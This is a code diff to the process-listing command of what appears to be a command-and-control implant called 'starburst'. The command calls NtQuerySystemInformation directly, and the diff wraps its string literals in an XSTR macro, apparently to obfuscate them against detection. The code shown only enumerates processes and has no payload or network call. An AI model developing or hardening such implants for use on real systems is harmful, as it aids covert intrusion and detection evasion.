@@ -20,7 +20,7 @@ auto declfn starburst::cmd_ps(
     auto  buf = static_cast<uint8_t*>( inst.heap_alloc( buf_size ) );
     if ( !buf ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+            XSTR( "alloc failed" ) );
         return;
     }
 
@@ -36,7 +36,7 @@ auto declfn starburst::cmd_ps(
         buf = static_cast<uint8_t*>( inst.heap_alloc( buf_size ) );
         if ( !buf ) {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+                XSTR( "alloc failed" ) );
             return;
         }
         status = inst.ntdll.NtQuerySystemInformation(
@@ -47,7 +47,7 @@ auto declfn starburst::cmd_ps(
     if ( status != 0 ) {
         inst.heap_free( buf );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "NtQuerySystemInformation failed" ) ) );
+            XSTR( "NtQuerySystemInformation failed" ) );
         return;
     }
 
@@ -56,7 +56,7 @@ auto declfn starburst::cmd_ps(
     if ( !pkg ) {
         inst.heap_free( buf );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+            XSTR( "alloc failed" ) );
         return;
     }
 
@@ -80,7 +80,7 @@ auto declfn starburst::cmd_ps(
                 proc_name, 260, nullptr, nullptr
             );
         } else {
-            str_copy( proc_name, symbol<char*>( const_cast<char*>( "[System Process]" ) ) );
+            str_copy( proc_name, XSTR( "[System Process]" ) );
         }
 
         uint32_t pid  = static_cast<uint32_t>( reinterpret_cast<uintptr_t>( spi->UniqueProcessId ) );
